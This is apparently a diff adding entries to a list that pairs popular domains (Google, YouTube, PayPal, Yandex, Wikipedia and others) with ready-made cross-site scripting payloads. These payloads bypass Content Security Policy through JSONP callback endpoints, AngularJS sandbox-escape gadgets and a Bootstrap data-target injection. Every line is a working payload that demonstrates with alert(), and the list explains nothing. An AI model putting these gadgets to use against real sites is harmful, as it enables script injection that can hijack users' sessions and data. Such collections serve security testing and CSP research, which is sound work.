+search.yahoo.com	<script src="https://search.yahoo.com/sugg/gossip/gossip-us-ura/?f=1&.crumb=wYtclSpdh3r&output=sd1&command=&pq=&l=1&bm=3&appid=exp-ats1.l7.search.vip.ir2.yahoo.com&t_stmp=1571806738592&nresults=10&bck=1he6d8leq7ddu%26b%3D3%26s%3Dcb&csrcpvid=8wNpljk4LjEYuM1FXaO1vgNfMTk1LgAAAAA5E2a9&vtestid=&mtestid=&spaceId=1197804867&callback=confirm"></script>
+secure.adnxs.com	<script src="https://secure.adnxs.com/getuidp?callback=alert(1)"></script>
+secure.gravatar.com	<script src="https://secure.gravatar.com/930fc2e7cd239606c398bff5b5fc12e7.json?callback=alert"></script>
+secure.quantserve.com	<script src="https://secure.quantserve.com/api/segments.json?callback=alert"></script>
+shop.samsung.com	<script src="https://shop.samsung.com/br/_v/private/ng/p4v1/getCartCount?callback=alert"></script>
+social.yandex.ru	<script src="https://social.yandex.ru/providers.jsonp?callback=alert"></script>
+soundcloud.com	<script src="https://soundcloud.com/oembed?format=js&callback=alert&url=https://soundcloud.com/rich-the-kid/plug-walk-1"></script>
+ssl.gstatic.com	<body ng-app ng-csp><script src="//ssl.gstatic.com/fsn/angular_js-bundle1.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>
+st3.zoom.us	<body ng-app ng-csp><script src="https://st3.zoom.us/static/6.2.7600/js/lib/angular.min.js"></script><div ng-app ng-csp><div ng-focus="x=$event;" id=f tabindex=0>foo</div><div ng-repeat="(key, value) in x.view"><div ng-if="key == 'window'">{{ [1].reduce(value.alert, 1); }}</div></div></div></body>
+static.parastorage.com	<body ng-app ng-csp><script src="https://static.parastorage.com/services/third-party/angularjs/1.4.5/angular.min.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>
+storage.googleapis.com	<script src="https://storage.googleapis.com/bypass_csp/xss.js"></script>
+suggestqueries-clients6.youtube.com	<script src="https://suggestqueries-clients6.youtube.com/complete/search?client=youtube&q=$query&callback=alert"></script>
+sync.im-apps.net	<script src="https://sync.im-apps.net/imid/segment?callback=alert(1)&token=VXoW9wEaCAYxiIkb8Mzm7Q"></script>
+tagmanager.google.com	<script src="https://tagmanager.google.com/debug/api/vtinfo?gtm_auth=a-0uanYFkML7e3v7Vmxpwg&env_id=env-8&public_id=GTM-TWMCBFD&templates=&callback=alert"></script>
+tcr9i.openai.com	<script src="https://tcr9i.openai.com/fc/a/?callback=alert"></script>
+translate.google.com	<script src="https://translate.google.com/translate_a/element.js?cb=alert"></script>
+translate.googleapis.com	<script src="https://translate.googleapis.com/$discovery/rest?version=v3&callback=alert();"></script>
+translate.yandex.net	<script src="https://translate.yandex.net/api/v1.5/tr.json/detect?callback=alert"></script>
+udgnoz7mccyaowzp.public.blob.vercel-storage.com	<script src="https://udgnoz7mccyaowzp.public.blob.vercel-storage.com/a-LAZhjxXucrzBiROqCt4bsY3n6srlWP.js"></script>
+uk.indeed.com	<script src="https://uk.indeed.com/m/newjobs?callback=alert"></script>
+ulogin.ru	<script src="https://ulogin.ru/token.php?callback=alert(1337)"></script>
+unpkg.com	<body ng-app ng-csp><script src="https://unpkg.com/angular@1.4.5/angular.min.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>
+vimeo.com	<script src="https://vimeo.com/api/v2/video/1006042481.json?callback=alert"></script>
+visitor.pixplug.in	<script src="https://visitor.pixplug.in/jsonp/getdata.php?callback=alert(1)"></script>
+wb.amap.com	<script src="https://wb.amap.com/channel.php?callback=alert"></script>
+widgets.pinterest.com	<script src="https://widgets.pinterest.com/v3/pidgets/boards/ciciwin/hedgehog-squirrel-crafts/pins/?callback=alert"></script>
+wikipedia.org	<script src="https://en.wikipedia.org/w/api.php?action=opensearch&format=json&limit=5&callback=alert&search=renniepak"></script>
+wordpress.org	<script src="https://wordpress.org/wp-json/wp/v2/posts/?_jsonp=alert"></script>
+www-api.ibm.com	<script src="https://www-api.ibm.com/search/typeahead/v1?lang=en&cc=us&query=l&callback=alert"></script>
+www.ancestrycdn.com	<body ng-app ng-csp><script src="https://www.ancestrycdn.com/ui-static/lib/angular/1.2.3/angular.min.js"></script><div ng-app ng-csp><div ng-focus="x=$event;" id=f tabindex=0>foo</div><div ng-repeat="(key, value) in x.view"><div ng-if="key == 'window'">{{ [1].reduce(value.alert, 1); }}</div></div></div></body>
+www.bing.com	<script src="https://www.bing.com/api/maps/mapcontrol?key=AlSfV3wSTlPFqxEdS97v1d1ZK25Qg4OxZerOAjFYQPZwtY4bQqhz4jDRou_kCmbJ&callback=alert"></script>
+www.blogger.com	<script src="https://www.blogger.com/feeds/8063678697117239807/posts/default?callback=alert"></script>
+www.google-analytics.com	<script src="https://www.google-analytics.com/debug/api/vtinfo?gtm_auth=a-0uanYFkML7e3v7Vmxpwg&env_id=env-8&public_id=GTM-TWMCBFD&templates=&callback=alert"></script>
+www.google.com	<script src="https://www.google.com/complete/search?client=chrome&q=hello&callback=alert#1"></script>
+www.google.com	<script src='https://www.google.com/recaptcha/about/js/main.min.js'></script><img src=x ng-on-error='$event.target.ownerDocument.defaultView.alert(1)'>
+www.googleapis.com	<script src="https://www.googleapis.com/customsearch/v1?callback=alert(1)"></script>
+www.googleapis.com	<script src="https://www.googleapis.com/blogger/v3/blogs/1/posts/1?callback=alert()"></script>
+www.googletagmanager.com	<script src="https://www.googletagmanager.com/debug/api/vtinfo?gtm_auth=a-0uanYFkML7e3v7Vmxpwg&env_id=env-8&public_id=GTM-TWMCBFD&templates=&callback=alert"></script>
+www.gstatic.com	<body ng-app ng-csp><script src="//www.gstatic.com/fsn/angular_js-bundle1.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>
+www.gstatic.com	<script src='https://www.gstatic.com/recaptcha/about/js/main.min.js'></script><img src=x ng-on-error='$event.target.ownerDocument.defaultView.alert(1)'>
+www.meteoprog.ua	<script src="https://www.meteoprog.ua/data/weather/informer/Poltava.js?callback=alert(1337)"></script>
+www.microsoft.com	<script src="https://www.microsoft.com/en-us/research/wp-json?_jsonp=alert"></script>
+www.paypal.com	<script src="https://www.paypal.com/checkoutnow/remembered?callback=alert"></script>
+www.recaptcha.net	<script src="https://www.recaptcha.net/recaptcha/api.js?onload=alert"></script>
+www.reddit.com	<script src="https://www.reddit.com/.json?limit=1&jsonp=alert"></script>
+www.roblox.com	<script src="https://www.roblox.com/item-thumbnails?params=[{assetId:1}]&jsoncallback=alert"></script>
+www.yastat.net	<body ng-app ng-csp><script src="https://www.yastat.net/s3/milab/js/angular.min.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>
+www.yastatic.net	<body ng-app ng-csp><script src="https://www.yastatic.net/s3/milab/js/angular.min.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>
+www.youtube.com	<script src="https://www.youtube.com/oembed?callback=alert(1)"></script>
+yandex.st	<script src="https://yandex.st/jquery/1.8.2/jquery.min.js"></script><script src="https://yandex.st/bootstrap/3.0.3/js/bootstrap.min.js"></script><button data-toggle="modal" data-target="$('head').html('<script>alert(1)</script>')">Test XSS</button>
+yastat.net	<body ng-app ng-csp><script src="https://yastat.net/s3/milab/js/angular.min.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>
+yastatic.net	<body ng-app ng-csp><script src="https://yastatic.net/s3/milab/js/angular.min.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>
+yuedust.yuedu.126.net	<body ng-app ng-csp><script src="//yuedust.yuedu.126.net/js/components/angular/angular.js"></script><div ng-app ng-csp><div ng-focus="x=$event;" id=f tabindex=0>foo</div><div ng-repeat="(key, value) in x.view"><div ng-if="key == 'window'">{{ [1].reduce(value.alert, 1); }}</div></div></div></body>
